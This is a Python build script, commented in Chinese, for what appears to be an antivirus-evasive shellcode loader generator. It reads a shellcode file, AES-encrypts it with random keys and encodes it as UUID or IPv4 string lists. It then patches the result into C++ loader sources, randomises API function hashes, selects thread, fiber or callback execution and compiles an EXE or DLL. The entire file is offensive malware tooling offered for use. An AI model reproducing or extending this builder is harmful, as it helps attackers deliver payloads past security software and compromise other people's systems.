import os
# 保存当前代码页
original_codepage = os.popen("chcp").read().strip()
# 更改代码页为 UTF-8
os.system("chcp 65001")
import encrypt
import patch
import random
import compiler
import argparse
import banner

parser = argparse.ArgumentParser()
# 在参数构造器中添加两个命令行参数
parser.add_argument('--i', type=str, default="shellcode文件路径")
parser.add_argument('--exec', type=str, default="callback") # 默认线程执行 1:thread 2:fiber 3:callback
parser.add_argument('--encode', type=str, default="uuid") # 默认线程执行 1:ipv4 2:uuid
parser.add_argument('--file', type=str, default="dll") # 默认线程执行 1:exe 2:dll
parser.add_argument('--export', type=str, default="导出函数文件路径") # 默认线程执行 1:exe 2:dll
args = parser.parse_args()

banner.banner()

FilePath = args.i
executeMethod = args.exec
encodeMethod = args.encode
filetype = args.file
exportPath = args.export

if args.file == "exe":
    cPath = "../../cLoader/cLoader/"
    print("[*] 源文件路径：" + cPath)
elif args.file == "dll":
    cPath = "../../cLoader/cDll/"
    print("[*] 源文件路径：" + cPath)
    if exportPath is not None:
        print("[*] 导出函数文件地址：" + exportPath)


keyAndivPath = cPath + "include/cLoader.h"
PatchPath = cPath + "src/cLoader.cpp"
DefinePath = cPath + "include/define.h"


if FilePath is not None:
    print("[*] shellcode bin 文件路径：" + FilePath)
    with open(FilePath, "rb") as f:
        ShellCode = f.read()                    # 初始化shellcode

Keys = encrypt.RandomKey(32)                # 初始化aes密钥
print("[*] 初始化 aes 密钥为：" + str(Keys)+ "!")
iv = encrypt.RandomKey(16)                  # 初始化aesIv
print("[*] 初始化 iv 为：" + str(iv)+ "!")
funchash = random.randint(1,9999)           # 初始化函数hash密钥

if filetype == "dll":
    if patch.ClearExportFunc(keyAndivPath) == 1:
        print("[*] 成功清楚源文件中原有的导出函数!")
    if patch.PatchKeyAndIv(keyAndivPath,Keys,iv,exportPath) == 1:
         print("[*] 成功 patch aes 密钥和 iv 到源文件!")
elif filetype == "exe":
    if patch.PatchKeyAndIv(keyAndivPath,Keys,iv,1) == 1:
         print("[*] 成功 patch aes 密钥和 iv 到源文件!")

# 加密shellcode
if Keys != -1:
    ShellCode = encrypt.AesEncrypt(ShellCode, Keys, iv) # aes加密
    print("[*] aes 加密后，shellcode 长度：" + str(len(ShellCode)))
    if encodeMethod == "ipv4":
        ipv4List = encrypt.Ipv4Encode(ShellCode)   
        print("[*] ipv4 编码后，列表长度：" + str(len(ipv4List)))            
    elif encodeMethod == "uuid":     
        UuidList = encrypt.UuidEncode(ShellCode)                 # uuid编码
        print("[*] uuid 编码后，列表长度：" + str(len(UuidList)))

# patch shellcode
if encodeMethod == "ipv4":
    if patch.PatchIpv4List(PatchPath,ipv4List,filetype) == -100:
        print("[*] 检测到源文件包含 ipv4/uuid 列表，需要清理!")
        if patch.ClearUuidIpv4List(PatchPath,filetype) == 1:
            print("[*] 源文件 ipv4/uuid 列表已经清理成功!")
        if patch.PatchIpv4List(PatchPath, ipv4List, filetype) == 1:
            print("[*] 源文件 ipv4 列表已经 patch 成功!")
elif encodeMethod == "uuid":
    # Patch uuidShellCode
    if patch.PatchUuidList(PatchPath, UuidList, filetype) == -100:
        print("[*] 检测到源文件包含 ipv4/uuid 列表，需要清理!")
        if patch.ClearUuidIpv4List(PatchPath,filetype) == 1:
            print("[*] 源文件 ipv4/uuid 列表已经清理成功!")
        if patch.PatchUuidList(PatchPath, UuidList, filetype) == 1:
            print("[*] 源文件 uuid 列表已经 patch 成功!")


# patch FunctionHash 和key
if patch.PatchFunctionHash(DefinePath,funchash) == 1:
    print("[*] 源文件函数哈希已经 patch 成功!")

# 编译
compiler.compile(cPath,executeMethod,encodeMethod,filetype)

